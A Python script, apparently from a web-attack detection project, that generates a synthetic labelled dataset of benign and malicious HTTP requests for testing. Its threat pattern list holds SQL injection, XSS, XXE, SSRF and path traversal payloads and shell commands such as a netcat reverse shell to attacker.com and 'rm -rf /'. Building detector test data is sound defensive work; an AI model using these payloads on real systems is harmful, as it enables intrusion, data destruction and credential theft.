#!/usr/bin/env python3
"""
WebGuard Test Dataset Generator
Generates 1000 test samples with 95% benign and 5% threat samples
for comprehensive experiential learning testing.
"""

import json
import csv
import random
import string
import time
from datetime import datetime, timedelta
from pathlib import Path
import urllib.parse

class WebGuardTestDataGenerator:
    def __init__(self, total_samples=1000, threat_percentage=5):
        self.total_samples = total_samples
        self.threat_samples = int(total_samples * threat_percentage / 100)
        self.benign_samples = total_samples - self.threat_samples
        
        # Common web paths and parameters
        self.benign_paths = [
            "/", "/home", "/about", "/contact", "/products", "/services",
            "/blog", "/news", "/search", "/login", "/register", "/profile",
            "/dashboard", "/settings", "/help", "/faq", "/terms", "/privacy",
            "/api/users", "/api/products", "/api/orders", "/api/status",
            "/images/logo.png", "/css/style.css", "/js/app.js", "/favicon.ico"
        ]
        
        self.threat_patterns = [
            # SQL Injection
            "' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT * FROM users --",
            "admin'--", "' OR 1=1#", "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            
            # XSS
            "<script>alert('xss')</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')", "<svg onload=alert(1)>", "';alert(String.fromCharCode(88,83,83))//",
            
            # Command Injection
            "; cat /etc/passwd", "| whoami", "&& ls -la", "; rm -rf /",
            "`cat /etc/shadow`", "$(whoami)", ";nc -e /bin/sh attacker.com 4444",
            
            # Path Traversal
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            # LDAP Injection
            "*)(&(objectClass=user)", "*)(uid=*))(|(uid=*", "admin)(&(password=*))",
            
            # XXE
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>",
            
            # SSRF
            "http://localhost:22", "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd", "gopher://127.0.0.1:25/",
        ]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]

    def generate_benign_request(self):
        """Generate a benign HTTP request"""
        method = random.choice(["GET", "POST", "PUT", "DELETE"])
        path = random.choice(self.benign_paths)
        
        # Add query parameters for some requests
        if random.random() < 0.3:
            params = []
            for _ in range(random.randint(1, 3)):
                key = random.choice(["id", "page", "limit", "sort", "filter", "q", "category"])
                value = random.choice([
                    str(random.randint(1, 100)),
                    random.choice(["asc", "desc", "name", "date", "price"]),
                    ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 10)))
                ])
                params.append(f"{key}={value}")
            path += "?" + "&".join(params)
        
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        
        if method in ["POST", "PUT"]:
            headers["Content-Type"] = random.choice([
                "application/json",
                "application/x-www-form-urlencoded",
                "multipart/form-data"
            ])
        
        body = ""
        if method in ["POST", "PUT"] and random.random() < 0.7:
            if headers["Content-Type"] == "application/json":
                body = json.dumps({
                    "name": f"user_{random.randint(1, 1000)}",
                    "email": f"user{random.randint(1, 1000)}@example.com",
                    "age": random.randint(18, 80)
                })
            else:
                body = "name=John&email=john@example.com&message=Hello"
        
        return {
            "id": f"benign_{random.randint(10000, 99999)}",
            "timestamp": (datetime.now() - timedelta(
                seconds=random.randint(0, 86400)
            )).isoformat(),
            "method": method,
            "path": path,
            "headers": headers,
            "body": body,
            "source_ip": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "label": "benign",
            "threat_type": None,
            "confidence": 0.0
        }

    def generate_threat_request(self):
        """Generate a malicious HTTP request"""
        method = random.choice(["GET", "POST", "PUT"])
        threat_pattern = random.choice(self.threat_patterns)
        
        # Determine threat type based on pattern
        threat_type = "unknown"
        if any(sql in threat_pattern.lower() for sql in ["'", "union", "select", "drop", "--", "#"]):
            threat_type = "sql_injection"
        elif any(xss in threat_pattern.lower() for xss in ["<script", "<img", "javascript:", "alert", "<svg"]):
            threat_type = "xss"
        elif any(cmd in threat_pattern for cmd in [";", "|", "&&", "`", "$("]):
            threat_type = "command_injection"
        elif ".." in threat_pattern or "etc/passwd" in threat_pattern:
            threat_type = "path_traversal"
        elif "ldap" in threat_pattern.lower() or "*)" in threat_pattern:
            threat_type = "ldap_injection"
        elif "<!DOCTYPE" in threat_pattern or "<!ENTITY" in threat_pattern:
            threat_type = "xxe"
        elif any(proto in threat_pattern.lower() for proto in ["http://", "file://", "gopher://"]):
            threat_type = "ssrf"
        
        # Inject threat pattern into different parts of the request
        injection_point = random.choice(["path", "query", "body", "header"])
        
        if injection_point == "path":
            path = f"/search/{urllib.parse.quote(threat_pattern)}"
        elif injection_point == "query":
            path = f"/search?q={urllib.parse.quote(threat_pattern)}"
        else:
            path = random.choice(self.benign_paths)
        
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "*/*",
            "Connection": "close",
        }
        
        if injection_point == "header":
            headers["X-Custom-Header"] = threat_pattern
        
        body = ""
        if method in ["POST", "PUT"]:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            if injection_point == "body":
                body = f"data={urllib.parse.quote(threat_pattern)}"
            else:
                body = "normal=data&field=value"
        
        return {
            "id": f"threat_{random.randint(10000, 99999)}",
            "timestamp": (datetime.now() - timedelta(
                seconds=random.randint(0, 86400)
            )).isoformat(),
            "method": method,
            "path": path,
            "headers": headers,
            "body": body,
            "source_ip": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "label": "threat",
            "threat_type": threat_type,
            "confidence": random.uniform(0.7, 1.0),
            "injection_point": injection_point,
            "pattern": threat_pattern
        }

    def generate_dataset(self):
        """Generate the complete dataset"""
        dataset = []
        
        print(f"Generating {self.benign_samples} benign samples...")
        for i in range(self.benign_samples):
            dataset.append(self.generate_benign_request())
            if (i + 1) % 100 == 0:
                print(f"  Generated {i + 1} benign samples")
        
        print(f"Generating {self.threat_samples} threat samples...")
        for i in range(self.threat_samples):
            dataset.append(self.generate_threat_request())
            if (i + 1) % 10 == 0:
                print(f"  Generated {i + 1} threat samples")
        
        # Shuffle the dataset
        random.shuffle(dataset)
        
        return dataset

    def save_dataset(self, dataset, base_path):
        """Save dataset in multiple formats"""
        base_path = Path(base_path)
        
        # Save as JSON
        json_path = base_path / "comprehensive_test_data.json"
        with open(json_path, 'w') as f:
            json.dump(dataset, f, indent=2)
        print(f"Saved JSON dataset: {json_path}")
        
        # Save as CSV
        csv_path = base_path / "comprehensive_test_data.csv"
        with open(csv_path, 'w', newline='') as f:
            if dataset:
                # Get all possible fieldnames from all records
                all_fieldnames = set()
                for row in dataset:
                    all_fieldnames.update(row.keys())
                
                writer = csv.DictWriter(f, fieldnames=sorted(all_fieldnames))
                writer.writeheader()
                for row in dataset:
                    # Convert complex fields to strings for CSV
                    csv_row = row.copy()
                    csv_row['headers'] = json.dumps(row['headers'])
                    # Ensure all fields are present
                    for field in all_fieldnames:
                        if field not in csv_row:
                            csv_row[field] = ""
                    writer.writerow(csv_row)
        print(f"Saved CSV dataset: {csv_path}")
        
        # Save summary statistics
        stats = {
            "total_samples": len(dataset),
            "benign_samples": len([r for r in dataset if r['label'] == 'benign']),
            "threat_samples": len([r for r in dataset if r['label'] == 'threat']),
            "threat_types": {},
            "methods": {},
            "generation_time": datetime.now().isoformat()
        }
        
        for request in dataset:
            if request['label'] == 'threat' and request['threat_type']:
                stats['threat_types'][request['threat_type']] = stats['threat_types'].get(request['threat_type'], 0) + 1
            stats['methods'][request['method']] = stats['methods'].get(request['method'], 0) + 1
        
        stats_path = base_path / "dataset_statistics.json"
        with open(stats_path, 'w') as f:
            json.dump(stats, f, indent=2)
        print(f"Saved statistics: {stats_path}")
        
        return stats

def main():
    """Main function to generate test dataset"""
    print("WebGuard Test Dataset Generator")
    print("=" * 40)
    
    generator = WebGuardTestDataGenerator(total_samples=1000, threat_percentage=5)
    
    print(f"Configuration:")
    print(f"  Total samples: {generator.total_samples}")
    print(f"  Benign samples: {generator.benign_samples} ({95}%)")
    print(f"  Threat samples: {generator.threat_samples} ({5}%)")
    print()
    
    # Generate dataset
    start_time = time.time()
    dataset = generator.generate_dataset()
    generation_time = time.time() - start_time
    
    print(f"\nDataset generation completed in {generation_time:.2f} seconds")
    
    # Save dataset
    data_dir = Path(__file__).parent.parent / "data"
    data_dir.mkdir(exist_ok=True)
    
    stats = generator.save_dataset(dataset, data_dir)
    
    print(f"\nDataset Statistics:")
    print(f"  Total samples: {stats['total_samples']}")
    print(f"  Benign: {stats['benign_samples']}")
    print(f"  Threats: {stats['threat_samples']}")
    print(f"  Threat types: {dict(stats['threat_types'])}")
    print(f"  HTTP methods: {dict(stats['methods'])}")
    
    print(f"\nDataset ready for experiential learning testing!")

if __name__ == "__main__":
    main()